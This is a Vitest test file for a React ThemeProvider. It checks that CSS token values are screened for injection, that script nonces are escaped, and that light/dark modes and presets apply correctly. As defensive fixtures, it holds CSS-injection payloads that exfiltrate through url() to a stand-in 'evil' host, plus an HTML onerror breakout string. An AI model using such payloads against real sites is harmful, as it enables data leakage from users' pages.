/**
 * ThemeProvider security tests (#323)
 *
 * Two security contracts are pinned here:
 *
 * 1. CSS-injection screen on product token VALUES. `applyTheme` writes
 *    consumer-supplied token values into
 *    `documentElement.style.setProperty('--x', value)`. A value carrying `;`,
 *    `url(`, `}`, `@import`, … breaks out of the eventual `var(--x)` declaration
 *    and enables CSS exfiltration. `isSafeTokenValue` is the chokepoint; an
 *    unsafe value must be SKIPPED (never written), a safe value must pass.
 *
 * 2. `themeScript` CSP nonce. The anti-flash SSR script is injected via
 *    `dangerouslySetInnerHTML`. `themeScript({ nonce })` must emit a nonce'd
 *    `<script>` tag for `script-src 'nonce-…'`; `themeScript()` must stay
 *    backward-compatible (bare body).
 */

import { describe, it, expect, beforeAll, afterEach, vi } from 'vitest'
import { render, cleanup, fireEvent, screen } from '@testing-library/react'
import type { ProductTheme } from '../tokens'
import { ThemeProvider, themeScript, presetColorVars, isSafeTokenValue, useTheme } from './ThemeProvider'

beforeAll(() => {
  // jsdom does not implement matchMedia; ThemeProvider reads it for system theme.
  if (typeof window.matchMedia !== 'function') {
    window.matchMedia = vi.fn().mockImplementation((query: string) => ({
      matches: false,
      media: query,
      onchange: null,
      addEventListener: vi.fn(),
      removeEventListener: vi.fn(),
      addListener: vi.fn(),
      removeListener: vi.fn(),
      dispatchEvent: vi.fn(),
    }))
  }
})

afterEach(() => {
  cleanup()
  // Clear any custom properties / attributes applyTheme wrote on the root.
  document.documentElement.removeAttribute('style')
  document.documentElement.removeAttribute('data-theme')
  document.documentElement.removeAttribute('data-product')
  document.documentElement.removeAttribute('data-theme-preset')
  document.documentElement.removeAttribute('data-tint-chrome')
  localStorage.clear()
})

describe('isSafeTokenValue', () => {
  describe('rejects values carrying a CSS-injection vector', () => {
    it.each([
      ['semicolon breakout', 'red; background: url(http://evil/?leak)'],
      ['bare semicolon', '#fff;'],
      ['url() exfiltration', 'url(http://evil/?leak)'],
      ['uppercase URL()', 'URL(http://evil/?leak)'],
      ['closing brace', '}'],
      ['opening brace', '.x {'],
      ['comment open', 'red /* x'],
      ['comment close', 'red */'],
      ['angle open', '<style>'],
      ['angle close', 'x>'],
      ['backslash escape', '\\3c script'],
      ['legacy expression()', 'expression(alert(1))'],
      ['uppercase EXPRESSION()', 'EXPRESSION(alert(1))'],
      ['@import at-rule', '@import url(http://evil)'],
      ['bare at sign', '@media'],
    ])('rejects %s', (_label, value) => {
      expect(isSafeTokenValue(value)).toBe(false)
    })
  })

  describe('accepts legitimate token values', () => {
    it.each([
      ['hex color', '#1B7FA8'],
      ['oklch()', 'oklch(0.6 0.1 230)'],
      ['rem length', '1.5rem'],
      ['var() reference', 'var(--x)'],
      ['color-mix()', 'color-mix(in oklab, red, blue 20%)'],
      ['named color', 'red'],
      ['rgb percentage', 'rgb(100% 0% 0%)'],
      ['unitless number', '1.25'],
      ['cubic-bezier easing', 'cubic-bezier(0, 0, 0.2, 1)'],
    ])('accepts %s', (_label, value) => {
      expect(isSafeTokenValue(value)).toBe(true)
    })
  })
})

describe('themeScript', () => {
  it('themeScript() returns the bare script body (backward-compatible)', () => {
    const out = themeScript()
    expect(typeof out).toBe('string')
    expect(out).not.toContain('<script')
    // Body still does the anti-flash work.
    expect(out).toContain('data-theme')
    expect(out).toContain('prefers-color-scheme')
  })

  it('themeScript({ nonce }) wraps the body in a nonce\'d <script> tag', () => {
    const out = themeScript({ nonce: 'abc' })
    expect(out).toContain('nonce="abc"')
    expect(out.startsWith('<script nonce="abc">')).toBe(true)
    expect(out.endsWith('</script>')).toBe(true)
    // The body is preserved inside the tag.
    expect(out).toContain('data-theme')
  })

  it('attribute-escapes a hostile nonce so it cannot break out of the tag', () => {
    const out = themeScript({ nonce: '"><img src=x onerror=alert(1)>' })
    // The raw breakout sequence must not appear verbatim.
    expect(out).not.toContain('"><img')
    expect(out).toContain('&quot;&gt;')
    // Exactly one opening script tag (no injected second element/attribute).
    expect(out.match(/<script/g)?.length).toBe(1)
  })
})

describe('ThemeProvider applyTheme injection screen', () => {
  it('does NOT write a token value containing a semicolon breakout', () => {
    const malicious: ProductTheme = {
      name: 'evil',
      tokens: {
        // `x` becomes `--color-x`; the value attempts a declaration breakout.
        color: { x: 'red; background: url(http://evil/?leak)' },
      },
    }

    render(
      <ThemeProvider disableStorage defaultProductTheme={malicious}>
        <div>child</div>
      </ThemeProvider>,
    )

    expect(
      document.documentElement.style.getPropertyValue('--color-x'),
    ).toBe('')
  })

  it('does NOT write a token value containing url()', () => {
    const malicious: ProductTheme = {
      name: 'evil-url',
      tokens: { color: { x: 'url(http://evil/?leak)' } },
    }

    render(
      <ThemeProvider disableStorage defaultProductTheme={malicious}>
        <div>child</div>
      </ThemeProvider>,
    )

    expect(
      document.documentElement.style.getPropertyValue('--color-x'),
    ).toBe('')
  })

  it('does NOT write a token value containing a closing brace', () => {
    const malicious: ProductTheme = {
      name: 'evil-brace',
      tokens: { color: { x: '#fff }' } },
    }

    render(
      <ThemeProvider disableStorage defaultProductTheme={malicious}>
        <div>child</div>
      </ThemeProvider>,
    )

    expect(
      document.documentElement.style.getPropertyValue('--color-x'),
    ).toBe('')
  })

  it('DOES write legitimate token values', () => {
    const safe: ProductTheme = {
      name: 'good',
      tokens: {
        color: {
          primary: '#1B7FA8',
          accent: 'oklch(0.6 0.1 230)',
          mixed: 'color-mix(in oklab, red, blue 20%)',
        },
      },
    }

    render(
      <ThemeProvider disableStorage defaultProductTheme={safe}>
        <div>child</div>
      </ThemeProvider>,
    )

    const root = document.documentElement.style
    expect(root.getPropertyValue('--color-primary')).toBe('#1B7FA8')
    expect(root.getPropertyValue('--color-accent')).toBe('oklch(0.6 0.1 230)')
    expect(root.getPropertyValue('--color-mixed')).toBe(
      'color-mix(in oklab, red, blue 20%)',
    )
  })

  it('drops only the unsafe key, keeping safe siblings', () => {
    const mixed: ProductTheme = {
      name: 'mixed',
      tokens: {
        color: {
          good: '#1B7FA8',
          bad: 'red; background: url(http://evil)',
        },
      },
    }

    render(
      <ThemeProvider disableStorage defaultProductTheme={mixed}>
        <div>child</div>
      </ThemeProvider>,
    )

    const root = document.documentElement.style
    expect(root.getPropertyValue('--color-good')).toBe('#1B7FA8')
    expect(root.getPropertyValue('--color-bad')).toBe('')
  })
})

/* ------------------------------------------------------------------ *
 *  Issue #370 — Mode-aware ProductTheme.tokens values
 *
 *  Product theme values may be either a flat string (legacy) or a
 *  `{ light, dark }` pair. `applyTheme` must pick the side that matches
 *  the active `data-theme` so mode toggling re-applies the right value
 *  instead of freezing the app in whichever mode was active.
 *
 *  Critical: the v0.28.0 #323 injection screen must still run on the
 *  RESOLVED value (a hostile `dark` value must be rejected just like a
 *  flat one).
 * ------------------------------------------------------------------ */

describe('ThemeProvider mode-aware product theme (#370)', () => {
  it('renders a flat-value product theme today (back-compat)', () => {
    const flat: ProductTheme = {
      name: 'flat-back-compat',
      tokens: {
        color: { primary: '#1B7FA8' },
      },
    }
    render(
      <ThemeProvider disableStorage defaultProductTheme={flat}>
        <div>child</div>
      </ThemeProvider>,
    )
    expect(document.documentElement.style.getPropertyValue('--color-primary')).toBe(
      '#1B7FA8',
    )
  })

  it('picks the light side when data-theme=light', () => {
    const themed: ProductTheme = {
      name: 'mode-aware-light',
      tokens: {
        color: {
          background: { light: '#FFFFFF', dark: '#011219' },
        },
      },
    }
    render(
      <ThemeProvider disableStorage defaultProductTheme={themed} forcedTheme="light">
        <div>child</div>
      </ThemeProvider>,
    )
    expect(document.documentElement.getAttribute('data-theme')).toBe('light')
    expect(document.documentElement.style.getPropertyValue('--color-background')).toBe(
      '#FFFFFF',
    )
  })

  it('picks the dark side when data-theme=dark', () => {
    const themed: ProductTheme = {
      name: 'mode-aware-dark',
      tokens: {
        color: {
          background: { light: '#FFFFFF', dark: '#011219' },
        },
      },
    }
    render(
      <ThemeProvider disableStorage defaultProductTheme={themed} forcedTheme="dark">
        <div>child</div>
      </ThemeProvider>,
    )
    expect(document.documentElement.getAttribute('data-theme')).toBe('dark')
    expect(document.documentElement.style.getPropertyValue('--color-background')).toBe(
      '#011219',
    )
  })

  it('toggling mode re-applies the matching side', () => {
    // Realistic toggle path: a child component calls `useTheme().setMode`,
    // which updates the internal `theme` state, which triggers the
    // re-apply effect. Mirrors how the lab/consumer's ThemeToggle works.
    const themed: ProductTheme = {
      name: 'mode-toggle',
      tokens: {
        color: {
          background: { light: '#FFFFFF', dark: '#011219' },
        },
      },
    }
    function Toggler() {
      const { setMode } = useTheme()
      return (
        <>
          <button onClick={() => setMode('light')}>light</button>
          <button onClick={() => setMode('dark')}>dark</button>
        </>
      )
    }
    render(
      <ThemeProvider disableStorage defaultProductTheme={themed} defaultMode="light">
        <Toggler />
      </ThemeProvider>,
    )
    expect(document.documentElement.style.getPropertyValue('--color-background')).toBe(
      '#FFFFFF',
    )

    fireEvent.click(screen.getByText('dark'))

    expect(document.documentElement.getAttribute('data-theme')).toBe('dark')
    expect(document.documentElement.style.getPropertyValue('--color-background')).toBe(
      '#011219',
    )
  })

  it('preserves the #323 sink invariant: hostile mode-aware value is rejected', () => {
    const malicious: ProductTheme = {
      name: 'evil-mode-aware',
      tokens: {
        color: {
          x: {
            light: '#FFFFFF',
            dark: 'red; background: url(http://evil/?leak)',
          },
        },
      },
    }
    render(
      <ThemeProvider disableStorage defaultProductTheme={malicious} forcedTheme="dark">
        <div>child</div>
      </ThemeProvider>,
    )
    // Resolved value (dark side) carries an injection vector → screen rejects → skip write.
    expect(document.documentElement.style.getPropertyValue('--color-x')).toBe('')
  })

  it('mixes flat and mode-aware values within the same theme', () => {
    const mixed: ProductTheme = {
      name: 'mixed-shapes',
      tokens: {
        color: {
          primary: '#1B7FA8', // flat: applies in both modes
          background: { light: '#FFFFFF', dark: '#011219' }, // mode-aware
        },
      },
    }
    render(
      <ThemeProvider disableStorage defaultProductTheme={mixed} forcedTheme="dark">
        <div>child</div>
      </ThemeProvider>,
    )
    const style = document.documentElement.style
    expect(style.getPropertyValue('--color-primary')).toBe('#1B7FA8')
    expect(style.getPropertyValue('--color-background')).toBe('#011219')
  })
})

/* ------------------------------------------------------------------ *
 *  Issue #371 — themeScript replays persisted product --color-* vars
 *
 *  With a persisted product theme in localStorage, the generated script
 *  body must contain `setProperty` calls for the `--color-*` vars so the
 *  pre-hydration paint matches the post-hydration paint. Unit-test the
 *  generated string content — we run the script in a fresh jsdom and
 *  check the resulting `<html>` style.
 * ------------------------------------------------------------------ */

describe('themeScript persisted product theme replay (#371)', () => {
  it('script body contains the persisted-theme parse + setProperty loop', () => {
    const body = themeScript()
    // Reads the product theme key from localStorage and walks tokens.
    expect(body).toContain('lando-product-theme')
    // Writes via the single setProperty sink (no re-parsing CSS sink).
    expect(body).toContain('setProperty')
    // Inlines the injection screen — known vectors should appear in the
    // deny list so the screen rejects them pre-hydration.
    expect(body).toContain('url(')
    expect(body).toContain('@import')
  })

  it('executing the script applies persisted product color vars before hydration', () => {
    // Persist a product theme — same shape ThemeProvider serializes.
    const stored = {
      name: 'persisted',
      tokens: {
        color: {
          primary: '#1B7FA8',
          background: { light: '#FFFFFF', dark: '#011219' },
        },
      },
    }
    localStorage.setItem('lando-product-theme', JSON.stringify(stored))
    // Force the mode resolution so the script picks the light side.
    localStorage.setItem('lando-theme-mode', 'light')

    // Run the script body in the current document — no React mounted.
    new Function(themeScript())()

    expect(document.documentElement.getAttribute('data-theme')).toBe('light')
    expect(document.documentElement.style.getPropertyValue('--color-primary')).toBe(
      '#1B7FA8',
    )
    expect(document.documentElement.style.getPropertyValue('--color-background')).toBe(
      '#FFFFFF',
    )
  })

  it('script picks the dark side when persisted mode is dark', () => {
    const stored = {
      name: 'persisted-dark',
      tokens: {
        color: {
          background: { light: '#FFFFFF', dark: '#011219' },
        },
      },
    }
    localStorage.setItem('lando-product-theme', JSON.stringify(stored))
    localStorage.setItem('lando-theme-mode', 'dark')

    new Function(themeScript())()

    expect(document.documentElement.getAttribute('data-theme')).toBe('dark')
    expect(document.documentElement.style.getPropertyValue('--color-background')).toBe(
      '#011219',
    )
  })

  it('script rejects unsafe persisted token values (inlined injection screen)', () => {
    const stored = {
      name: 'evil',
      tokens: {
        color: {
          x: 'red; background: url(http://evil/?leak)',
        },
      },
    }
    localStorage.setItem('lando-product-theme', JSON.stringify(stored))
    localStorage.setItem('lando-theme-mode', 'light')

    new Function(themeScript())()

    // The inlined screen must reject the value, leaving `--color-x` unset.
    expect(document.documentElement.style.getPropertyValue('--color-x')).toBe('')
  })

  it('script is a no-op when no product theme is persisted', () => {
    // No localStorage value; script should still run cleanly and only set
    // `data-theme` (the existing pre-#371 behavior).
    localStorage.removeItem('lando-product-theme')

    new Function(themeScript())()

    // No --color-* var written.
    expect(document.documentElement.style.getPropertyValue('--color-primary')).toBe('')
  })

  it('inlined screen mirrors isSafeTokenValue length cap', () => {
    // 501-char value should be rejected by the inlined screen (matches the
    // #323 length cap from isSafeTokenValue).
    const longVal = 'a'.repeat(501)
    const stored = {
      name: 'long',
      tokens: { color: { x: longVal } },
    }
    localStorage.setItem('lando-product-theme', JSON.stringify(stored))
    localStorage.setItem('lando-theme-mode', 'light')

    new Function(themeScript())()
    expect(document.documentElement.style.getPropertyValue('--color-x')).toBe('')
  })
})

/* ------------------------------------------------------------------ *
 *  Issue #440 / #337 — presetColorVars + themeScript({ defaultPreset })
 *
 *  presetColorVars is the single source of truth for the preset.colors →
 *  `--color-*` mapping (kills the #337 copy/paste). themeScript({
 *  defaultPreset }) inlines that map so the DEFAULT-brand case paints its
 *  preset colors before hydration — but only on first visit (no persisted
 *  preset). A persisted preset must suppress the inlined default.
 * ------------------------------------------------------------------ */

describe('presetColorVars (#337, #440)', () => {
  it('maps the lando preset colors to the expected --color-* names', () => {
    const vars = presetColorVars('lando')
    expect(vars['--color-primary']).toBe('#1B7FA8')
    expect(vars['--color-secondary']).toBe('#2DBFBF')
    expect(vars['--color-accent']).toBe('#2BA3D4')
    expect(vars['--color-success-base']).toBe('#2DBFBF')
    expect(vars['--color-info-base']).toBe('#2BA3D4')
  })

  it('omits keys the preset does not define (midnight has no secondary)', () => {
    const vars = presetColorVars('midnight')
    expect(vars['--color-primary']).toBe('#6366F1')
    // midnight.colors has no `secondary` → the var must be absent, not empty.
    expect('--color-secondary' in vars).toBe(false)
  })

  it('resolves the legacy `ocean` alias like `lando`', () => {
    expect(presetColorVars('ocean')).toEqual(presetColorVars('lando'))
  })

  it('returns an empty map for an unknown preset id', () => {
    expect(presetColorVars('does-not-exist')).toEqual({})
  })
})

describe('themeScript defaultPreset (#440)', () => {
  it('emits the preset color setProperty writes when defaultPreset is given', () => {
    const body = themeScript({ defaultPreset: 'lando' })
    // The inlined descriptor carries the preset id + its color vars.
    expect(body).toContain('data-theme-preset')
    expect(body).toContain('--color-primary')
    expect(body).toContain('#1B7FA8')
    // Still a single setProperty sink (no re-parsing).
    expect(body).toContain('setProperty')
    // The placeholder must have been substituted (no leftover no-op literal).
    expect(body).not.toContain('/*__DEFAULT_PRESET__*/null')
  })

  it('plain themeScript() leaves the default-preset block a no-op (placeholder null)', () => {
    const body = themeScript()
    // Without defaultPreset the descriptor stays `null` → block is inert.
    expect(body).toContain('/*__DEFAULT_PRESET__*/null')
  })

  it('applies the default preset before hydration when NO preset is persisted', () => {
    localStorage.removeItem('lando-theme-preset')
    localStorage.setItem('lando-theme-mode', 'light')

    new Function(themeScript({ defaultPreset: 'lando' }))()

    expect(document.documentElement.getAttribute('data-theme-preset')).toBe('lando')
    expect(document.documentElement.style.getPropertyValue('--color-primary')).toBe(
      '#1B7FA8',
    )
    expect(document.documentElement.style.getPropertyValue('--color-secondary')).toBe(
      '#2DBFBF',
    )
  })

  it('does NOT override a persisted preset with the default (persisted wins)', () => {
    // User persisted `forest`; the inlined `lando` default must NOT apply.
    localStorage.setItem('lando-theme-preset', 'forest')
    localStorage.setItem('lando-theme-mode', 'light')

    new Function(themeScript({ defaultPreset: 'lando' }))()

    // The attribute reflects the persisted preset, not the default.
    expect(document.documentElement.getAttribute('data-theme-preset')).toBe('forest')
    // lando's primary (#1B7FA8) must NOT have been written by the default block.
    expect(document.documentElement.style.getPropertyValue('--color-primary')).toBe('')
  })

  it('unknown defaultPreset id is a no-op (placeholder stays null)', () => {
    const body = themeScript({ defaultPreset: 'nope' })
    expect(body).toContain('/*__DEFAULT_PRESET__*/null')
  })

  it('composes with a nonce (wrapped tag still carries the inlined preset)', () => {
    const out = themeScript({ defaultPreset: 'lando', nonce: 'abc' })
    expect(out.startsWith('<script nonce="abc">')).toBe(true)
    expect(out.endsWith('</script>')).toBe(true)
    expect(out).toContain('#1B7FA8')
  })
})

/* ------------------------------------------------------------------ *
 *  Issue #381 — Server-resolved initialMode for SSR alignment
 *
 *  When the consumer knows the resolved theme at request time (cookie /
 *  edge middleware), passing `initialMode="dark"` must make
 *  `useTheme().mode` return `'dark'` on first render (both SSR and CSR
 *  pre-hydration) — no `ThemeCookieSync` workaround needed.
 *
 *  Without `initialMode`, behavior is unchanged from before.
 * ------------------------------------------------------------------ */

describe('ThemeProvider initialMode (#381)', () => {
  it('useTheme().mode returns the initialMode value on first render', () => {
    let observedMode: string | null = null
    function Probe() {
      const ctx = useTheme()
      observedMode = ctx.mode
      return <div>{ctx.mode}</div>
    }
    render(
      <ThemeProvider disableStorage initialMode="dark">
        <Probe />
      </ThemeProvider>,
    )
    expect(observedMode).toBe('dark')
  })

  it('useTheme().theme returns the initialMode value on first render', () => {
    let observedTheme: string | null = null
    function Probe() {
      const ctx = useTheme()
      observedTheme = ctx.theme
      return <div>{ctx.theme}</div>
    }
    render(
      <ThemeProvider disableStorage initialMode="light">
        <Probe />
      </ThemeProvider>,
    )
    expect(observedTheme).toBe('light')
  })

  it('without initialMode, behavior is unchanged (defaults to system → light in jsdom)', () => {
    let observedMode: string | null = null
    function Probe() {
      const ctx = useTheme()
      observedMode = ctx.mode
      return <div>{ctx.mode}</div>
    }
    render(
      <ThemeProvider disableStorage>
        <Probe />
      </ThemeProvider>,
    )
    expect(observedMode).toBe('system')
  })

  it('persisted localStorage mode overrides initialMode after hydration', () => {
    localStorage.setItem('lando-theme-mode', 'light')
    let observedMode: string | null = null
    function Probe() {
      const ctx = useTheme()
      observedMode = ctx.mode
      return <div>{ctx.mode}</div>
    }
    render(
      <ThemeProvider initialMode="dark">
        <Probe />
      </ThemeProvider>,
    )
    // The load effect runs synchronously (RTL flushes effects) — persisted
    // 'light' wins over initialMode 'dark' once we hydrate.
    expect(observedMode).toBe('light')
  })

  it('initialMode is honored when there is no persisted preference', () => {
    // No localStorage value; effect should NOT clobber initialMode with 'system'.
    let observedMode: string | null = null
    function Probe() {
      const ctx = useTheme()
      observedMode = ctx.mode
      return <div>{ctx.mode}</div>
    }
    render(
      <ThemeProvider initialMode="dark">
        <Probe />
      </ThemeProvider>,
    )
    expect(observedMode).toBe('dark')
  })
})

/* ------------------------------------------------------------------ *
 *  Issue #440 — Declarative SSR-safe `preset` prop
 *
 *  `<ThemeProvider preset="lando">` must type-check (it did not before —
 *  the docstrings advertised it but the prop was missing → TS2322) AND
 *  apply the preset on first render: `data-theme-preset` + the preset's
 *  `--color-*` overrides on :root, with `useTheme().themePreset` echoing it.
 *  A persisted preset in localStorage wins after hydration; the declared
 *  preset holds when nothing is stored (mirrors `initialMode`).
 * ------------------------------------------------------------------ */

describe('ThemeProvider preset prop (#440)', () => {
  it('type-checks and applies the declared preset on first render', () => {
    // The mere fact this compiles is the #440 fix (preset was not a prop).
    let observedPreset: string | null = null
    function Probe() {
      const ctx = useTheme()
      observedPreset = ctx.themePreset
      return <div>{ctx.themePreset}</div>
    }
    render(
      <ThemeProvider disableStorage preset="lando">
        <Probe />
      </ThemeProvider>,
    )

    // Context echoes the declared preset.
    expect(observedPreset).toBe('lando')
    // The preset attribute + a preset color override land on :root.
    expect(document.documentElement.getAttribute('data-theme-preset')).toBe('lando')
    expect(document.documentElement.style.getPropertyValue('--color-primary')).toBe(
      '#1B7FA8',
    )
    // Secondary base is also part of the `lando` preset (drives the ramp).
    expect(document.documentElement.style.getPropertyValue('--color-secondary')).toBe(
      '#2DBFBF',
    )
  })

  it('defaults to no preset (brand-neutral) when `preset` is omitted', () => {
    let observedPreset: string | null = null
    function Probe() {
      const ctx = useTheme()
      observedPreset = ctx.themePreset
      return <div>{ctx.themePreset}</div>
    }
    render(
      <ThemeProvider disableStorage>
        <Probe />
      </ThemeProvider>,
    )
    // DEFAULT_THEME_PRESET is the empty-string sentinel → no preset attribute.
    expect(observedPreset).toBe('')
    expect(document.documentElement.getAttribute('data-theme-preset')).toBe(null)
  })

  it('a persisted preset in localStorage wins over the declared preset after hydration', () => {
    // User previously chose `forest`; it must override a declared `lando`.
    localStorage.setItem('lando-theme-preset', 'forest')
    let observedPreset: string | null = null
    function Probe() {
      const ctx = useTheme()
      observedPreset = ctx.themePreset
      return <div>{ctx.themePreset}</div>
    }
    render(
      <ThemeProvider preset="lando">
        <Probe />
      </ThemeProvider>,
    )
    // The load effect runs synchronously under RTL — persisted 'forest' wins.
    expect(observedPreset).toBe('forest')
    expect(document.documentElement.getAttribute('data-theme-preset')).toBe('forest')
  })

  it('declared preset is honored when nothing valid is persisted (no clobber)', () => {
    // The getStoredThemePresetRaw() raw read is what prevents the missing case
    // from coercing to DEFAULT_THEME_PRESET and clobbering the declared preset.
    let observedPreset: string | null = null
    function Probe() {
      const ctx = useTheme()
      observedPreset = ctx.themePreset
      return <div>{ctx.themePreset}</div>
    }
    render(
      <ThemeProvider preset="midnight">
        <Probe />
      </ThemeProvider>,
    )
    expect(observedPreset).toBe('midnight')
    expect(document.documentElement.getAttribute('data-theme-preset')).toBe('midnight')
  })
})
